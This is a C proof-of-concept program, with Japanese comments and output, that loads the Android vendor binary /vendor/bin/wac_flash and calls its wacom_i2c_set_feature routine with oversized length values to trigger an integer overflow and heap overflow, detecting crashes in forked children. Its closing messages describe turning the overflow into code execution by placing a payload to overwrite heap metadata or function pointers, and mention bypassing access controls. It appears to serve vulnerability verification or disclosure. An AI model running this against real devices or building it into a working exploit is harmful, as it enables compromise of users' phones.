#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/types.h>

// ============================================================
// 1. 関数プロトタイプ (解析結果に基づくシグネチャ)
// ============================================================
typedef int (*wacom_i2c_set_feature_t)(int fd, int cmd, uint32_t len, void *data, int a4, int a5);
typedef int (*wacom_i2c_get_feature_t)(int fd, int cmd, uint32_t len, void *data, int a4, int a5, int delay);

// ============================================================
// 2. グローバル設定
// ============================================================
static const char *TARGET_LIB = "/vendor/bin/wac_flash";
static int g_dummy_fd = -1;

// ============================================================
// 3. シグナルハンドラ (クラッシュ検出用)
// ============================================================
static void signal_handler(int sig, siginfo_t *info, void *context) {
    fprintf(stderr, "\n[!!!] CRASH DETECTED: Signal %d (%s) at address %p\n",
            sig, strsignal(sig), info->si_addr);
    fprintf(stderr, "[!!!] This indicates memory corruption was successfully triggered.\n");
    _exit(1);
}

static void setup_signal_handlers(void) {
    struct sigaction sa = {0};
    sa.sa_sigaction = signal_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESETHAND;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);
    sigaction(SIGILL,  &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
}

// ============================================================
// 4. テストランナー (forkで分離実行)
// ============================================================
typedef void (*test_func_t)(void *arg);

static int run_test(test_func_t test, void *arg, const char *test_name) {
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        return -1;
    }

    if (pid == 0) {
        // 子プロセス: テスト実行
        setup_signal_handlers();
        test(arg);
        exit(0);
    } else {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            int code = WEXITSTATUS(status);
            printf("[*] %s: Exited with code %d\n", test_name, code);
            return code;
        } else if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            printf("[!] %s: CRASHED with signal %d (%s)\n", test_name, sig, strsignal(sig));
            return -sig;
        }
        return 0;
    }
}

// ============================================================
// 5. テストケース1: len = 0xFFFFFFFF (最大オーバーフロー)
// ============================================================
typedef struct {
    wacom_i2c_set_feature_t func;
    int fd;
} test_args_t;

static void test_case_overflow(void *arg) {
    test_args_t *args = (test_args_t *)arg;
    wacom_i2c_set_feature_t func = args->func;
    int fd = args->fd;

    uint32_t evil_len = 0xFFFFFFFF;
    size_t data_size = 0x100000; // 1MB
    uint8_t *data = malloc(data_size);
    if (!data) {
        perror("malloc data");
        exit(1);
    }
    memset(data, 0x41, data_size); // 'A'パターン

    printf("[*] len=0x%x (total_len=%u) -> ヒープオーバーフローを誘発\n",
           evil_len, evil_len + 8);
    fflush(stdout);

    // ★ 脆弱性発火 ★
    int ret = func(fd, 0x30, evil_len, data, 0, 0);

    // ここに到達したら異常（通常はクラッシュ済み）
    printf("[?] 予期せず戻り値 %d を受け取りました\n", ret);
    free(data);
    exit(0);
}

// ============================================================
// 6. テストケース2: len = 0xFFFFFFF8 (malloc(0)ケース)
// ============================================================
static void test_case_malloc_zero(void *arg) {
    test_args_t *args = (test_args_t *)arg;
    wacom_i2c_set_feature_t func = args->func;
    int fd = args->fd;

    uint32_t evil_len = 0xFFFFFFF8; // +8 => 0
    size_t data_size = 0x10000;
    uint8_t *data = malloc(data_size);
    if (!data) {
        perror("malloc data");
        exit(1);
    }
    memset(data, 0x42, data_size);

    printf("[*] len=0x%x (total_len=0) -> malloc(0) に書き込み\n", evil_len);
    fflush(stdout);

    int ret = func(fd, 0x30, evil_len, data, 0, 0);
    printf("[?] 戻り値 %d\n", ret);
    free(data);
    exit(0);
}

// ============================================================
// 7. テストケース3: len = 0xFFFF0000 (メモリ確保失敗)
// ============================================================
static void test_case_large_alloc(void *arg) {
    test_args_t *args = (test_args_t *)arg;
    wacom_i2c_set_feature_t func = args->func;
    int fd = args->fd;

    uint32_t evil_len = 0xFFFF0000;
    size_t data_size = 0x10000;
    uint8_t *data = malloc(data_size);
    if (!data) {
        perror("malloc data");
        exit(1);
    }
    memset(data, 0x43, data_size);

    printf("[*] len=0x%x (total_len=%u) -> 巨大メモリ確保要求\n",
           evil_len, evil_len + 8);
    fflush(stdout);

    int ret = func(fd, 0x30, evil_len, data, 0, 0);
    printf("[?] 戻り値 %d\n", ret);
    free(data);
    exit(0);
}

// ============================================================
// 8. テストケース4: len = 0x00000000 (境界条件)
// ============================================================
static void test_case_zero_len(void *arg) {
    test_args_t *args = (test_args_t *)arg;
    wacom_i2c_set_feature_t func = args->func;
    int fd = args->fd;

    uint32_t evil_len = 0;
    uint8_t data[1] = {0};

    printf("[*] len=0 (total_len=8) -> 正常系\n");
    fflush(stdout);

    int ret = func(fd, 0x30, evil_len, data, 0, 0);
    printf("[+] 戻り値 %d\n", ret);
    exit(0);
}

// ============================================================
// 9. メイン処理
// ============================================================
int main(int argc, char **argv) {
    printf("============================================================\n");
    printf("  /vendor/bin/wac_flash 脆弱性検証プログラム\n");
    printf("  対象: wacom_i2c_set_feature 整数オーバーフロー\n");
    printf("============================================================\n\n");

    // シグナルハンドラ（親プロセス用）
    setup_signal_handlers();

    // ダイナミックロード
    void *handle = dlopen(TARGET_LIB, RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "[ERROR] dlopen(%s) 失敗: %s\n", TARGET_LIB, dlerror());
        fprintf(stderr, "[INFO] 共有ライブラリとしてロードできない場合、\n");
        fprintf(stderr, "       LD_PRELOAD や ptrace 経由の手法が必要です。\n");
        fprintf(stderr, "       ACLバイパス環境ではサービス経由で同様の引数を与えてください。\n");
        return 1;
    }
    printf("[+] dlopen 成功: %s\n", TARGET_LIB);

    // シンボル解決
    wacom_i2c_set_feature_t set_feature =
        (wacom_i2c_set_feature_t)dlsym(handle, "wacom_i2c_set_feature");
    if (!set_feature) {
        fprintf(stderr, "[ERROR] dlsym(wacom_i2c_set_feature) 失敗: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }
    printf("[+] シンボル解決: wacom_i2c_set_feature @ %p\n", set_feature);

    // I2Cデバイスオープン (ダミーでも動作可)
    int fd = open("/dev/i2c-2", O_RDWR);
    if (fd < 0) {
        perror("[WARN] /dev/i2c-2 オープン失敗");
        fd = -1;
        printf("[INFO] ダミーFD(%d)を使用します (writeは失敗しますが、memcpyは実行されます)\n", fd);
    } else {
        printf("[+] I2Cデバイスオープン成功: fd=%d\n", fd);
    }

    test_args_t args = { .func = set_feature, .fd = fd };

    // テスト実行
    int results[4] = {0};

    printf("\n--- テスト1: len=0xFFFFFFFF (ヒープオーバーフロー) ---\n");
    results[0] = run_test(test_case_overflow, &args, "Overflow(0xFFFFFFFF)");

    printf("\n--- テスト2: len=0xFFFFFFF8 (malloc(0)) ---\n");
    results[1] = run_test(test_case_malloc_zero, &args, "malloc(0)");

    printf("\n--- テスト3: len=0xFFFF0000 (大容量確保) ---\n");
    results[2] = run_test(test_case_large_alloc, &args, "Large alloc");

    printf("\n--- テスト4: len=0 (正常系ベースライン) ---\n");
    results[3] = run_test(test_case_zero_len, &args, "Zero len");

    // 結果サマリー
    printf("\n============================================================\n");
    printf("  検証結果サマリー\n");
    printf("============================================================\n");
    printf("テスト1 (0xFFFFFFFF): %s\n",
           results[0] < 0 ? "[!] クラッシュ発生 → 脆弱性実証成功" : "[-] クラッシュせず (予想外)");
    printf("テスト2 (0xFFFFFFF8): %s\n",
           results[1] < 0 ? "[!] クラッシュ発生 → 異常動作確認" : "[-] クラッシュせず");
    printf("テスト3 (0xFFFF0000): %s\n",
           results[2] < 0 ? "[!] クラッシュ発生 → 異常動作確認" : "[-] クラッシュせず");
    printf("テスト4 (0x00000000): %s\n",
           results[3] == 0 ? "[+] 正常終了 (ベースライン)" : "[?] 予期せぬ終了");

    if (results[0] < 0) {
        printf("\n[★] 脆弱性 CONFIRMED: 整数オーバーフローによりヒープオーバーフローが誘発可能です。\n");
        printf("    攻撃者はデータ部に任意のペイロードを配置し、\n");
        printf("    ヒープ管理構造や関数ポインタを書き換えることでコード実行に移行できます。\n");
    } else {
        printf("\n[?] 脆弱性が発現しませんでした。環境の差異や保護機構の可能性があります。\n");
        printf("    実際のサービス経由での呼び出しでは引数が制御可能な場合を想定してください。\n");
    }

    if (fd >= 0) close(fd);
    dlclose(handle);
    return 0;
}
